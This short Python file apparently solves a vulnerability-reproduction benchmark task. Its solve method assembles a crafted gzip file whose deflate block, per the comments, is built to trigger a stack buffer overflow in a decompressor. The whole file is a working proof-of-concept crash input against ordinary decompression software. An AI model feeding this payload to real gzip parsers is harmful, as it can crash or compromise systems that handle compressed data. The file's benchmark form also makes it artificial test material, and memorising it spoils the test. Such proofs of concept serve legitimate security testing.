import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Gzip header (10 bytes)
        gzip_header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff'
        
        # Deflate data (9 bytes) designed to trigger stack buffer overflow
        # BFINAL=1, BTYPE=10 (dynamic Huffman)
        # HLIT=0, HDIST=0, HCLEN=14 (18 code length codes)
        # 18 code length code lengths of 0 (each 3 bits) + 1 padding bit
        deflate_data = bytes([5, 192, 1, 0, 0, 0, 0, 0, 0])
        
        # Gzip footer: CRC32=0, ISIZE=0 (8 bytes)
        gzip_footer = b'\x00\x00\x00\x00\x00\x00\x00\x00'
        
        poc = gzip_header + deflate_data + gzip_footer
        return poc